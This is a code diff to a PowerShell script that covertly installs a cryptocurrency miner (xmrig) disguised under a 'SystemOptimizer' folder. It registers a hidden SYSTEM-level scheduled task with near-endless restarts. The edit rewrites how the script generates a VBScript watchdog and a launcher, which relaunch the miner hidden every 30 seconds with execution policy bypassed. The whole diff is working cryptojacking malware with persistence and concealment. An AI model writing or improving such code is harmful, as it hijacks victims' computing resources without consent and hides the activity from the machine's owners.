@@ -88,23 +88,27 @@ $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccou
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Hours 0)
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
 
-# Create watchdog.vbs (persistent, restarts miner if dead)
-$watchdogContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" +
-'Set WMI = GetObject("winmgmts:")' + "`n" +
-'Do' + "`n" +
-'    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = ''xmrig.exe'' AND ExecutablePath LIKE ''%SystemOptimizer%''")' + "`n" +
-'    If procs.Count = 0 Then' + "`n" +
-'        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = ''" + $xmrigExe + "''; `$configFile = ''" + $configFile + "''; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False' + "`n" +
-'    End If' + "`n" +
-'    WScript.Sleep 30000' + "`n" +
-'Loop'
-$watchdogContent | Out-File -FilePath "$baseDir\watchdog.vbs" -Encoding ascii
+# Create watchdog.vbs (persistent, restarts miner if dead) - write directly
+$watchdogPath = "$baseDir\watchdog.vbs"
+@'
+Set WshShell = CreateObject("WScript.Shell")
+Set WMI = GetObject("winmgmts:")
+Do
+    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'xmrig.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
+    If procs.Count = 0 Then
+        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { $xmrigExe = '%XMRIG_EXE%'; $configFile = '%CONFIG_FILE%'; $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('"' + $xmrigExe + '" --config="'" + $configFile + "'"', 0, $false) }""", 0, False
+    End If
+    WScript.Sleep 30000
+Loop
+'@ -replace '%XMRIG_EXE%', $xmrigExe -replace '%CONFIG_FILE%', $configFile | Out-File -FilePath $watchdogPath -Encoding ascii
 
 # Create launch.vbs (for manual start)
-$launchContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" +
-'WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = ''" + $xmrigExe + "''; `$configFile = ''" + $configFile + "''; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False'
-$launchContent | Out-File -FilePath "$baseDir\launch.vbs" -Encoding ascii
+$launchPath = "$baseDir\launch.vbs"
+@'
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { $xmrigExe = '%XMRIG_EXE%'; $configFile = '%CONFIG_FILE%'; $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('"' + $xmrigExe + '" --config="'" + $configFile + "'"', 0, $false) }""", 0, False
+'@ -replace '%XMRIG_EXE%', $xmrigExe -replace '%CONFIG_FILE%', $configFile | Out-File -FilePath $launchPath -Encoding ascii
 
 # Start watchdog now (hidden)
 $wshell = New-Object -ComObject WScript.Shell
-$wshell.Run('wscript.exe "' + $baseDir + '\watchdog.vbs"', 0, $false)
+$wshell.Run('wscript.exe "' + $watchdogPath + '"', 0, $false)
